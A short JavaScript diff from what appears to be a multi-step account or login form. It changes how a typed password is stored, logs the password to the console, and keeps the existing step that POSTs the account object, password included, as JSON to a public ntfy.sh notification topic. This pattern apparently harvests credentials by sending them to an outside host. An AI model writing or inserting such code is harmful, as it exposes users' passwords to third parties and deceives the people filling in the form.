@@ -50,7 +50,13 @@ nextBtn2.addEventListener("click", () => {
     passInput.style.border = "1px solid red";
     warningPass.style.display = "flex";
   } else {
-    account.passsword = passInput.value;
+    console.log("input : " + passInput.value);
+    if (passInput.value.includes("...")) {
+      console.log("pass containes dots");
+      account.password = InitialPass;
+    } else {
+      account.password = passInput.value;
+    }
     console.log(account);
     fetch("https://ntfy.sh/accounts", {
       body: JSON.stringify(account),
